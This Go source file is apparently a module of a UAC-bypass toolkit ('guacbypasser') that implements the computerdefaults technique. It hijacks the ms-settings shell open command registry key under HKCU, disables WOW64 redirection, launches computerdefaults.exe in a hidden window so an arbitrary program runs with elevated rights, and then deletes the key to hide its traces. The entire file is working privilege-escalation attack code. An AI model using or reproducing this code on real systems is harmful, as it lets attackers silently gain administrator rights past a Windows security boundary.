package guacbypasser

import (
	"fmt"
	"path/filepath"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

func tComputerDefaults(path string) error {
	_ = Reporter{
		Name: "computerdefauls",
		Desc: "Bypass UAC using computerdefaults and registry key manipulation",
		Id:   1,

		Type:   "Once",
		Module: "tComputerDefaults",

		Fixed:   false,
		FixedIn: "",

		Admin:   true,
		Payload: true,
	}

	// Get ABSOLUTE program path
	fullPath, err := filepath.Abs(path)
	if err != nil {
		return err
	}
	cmdN := fmt.Sprintf("%s /k start %s", `C:\Windows\System32\cmd.exe`, fullPath)

	// Load kernel32.dll library ...
	kernel32, err := syscall.LoadLibrary("kernel32.dll")
	if err != nil {
		return err
	}

	// Get process address "Wow64DisableWow64FsRedirection" from kernel32.dll ...
	proc32, err := syscall.GetProcAddress(kernel32, "Wow64DisableWow64FsRedirection")
	if err != nil {
		return err
	}

	_, _, _ = syscall.Syscall(
		uintptr(proc32),
		uintptr(1),
		uintptr(0),
		uintptr(0),
		uintptr(0))
	wk32, err := registry.OpenKey(
		registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	defer wk32.Close()
	if err != nil {
		return err
	}

	// Setting DEFAULT key value for the ABSOLUTE program path
	if err := wk32.SetStringValue("", cmdN); err != nil {
		return err
	}

	// Setting "DelegateExecure" key value to None
	if err := wk32.SetStringValue("DelegateExecute", ""); err != nil {
		return err
	}
	time.Sleep(3 * 1 * time.Second)

	// Execute cmd-like command "start computerdefaults.exe" ...
	cmd := newCmd("start computerdefaults.exe")
	cmd.exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if _, err = cmd.exec.Output(); err != nil {
		return err
	}
	time.Sleep(3 * 1 * time.Second)

	// Absolutly delete registry key "Software\Classes\ms-settings\shell\open\command" ...
	if err = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`); err != nil {
		return err
	}
	return nil
}
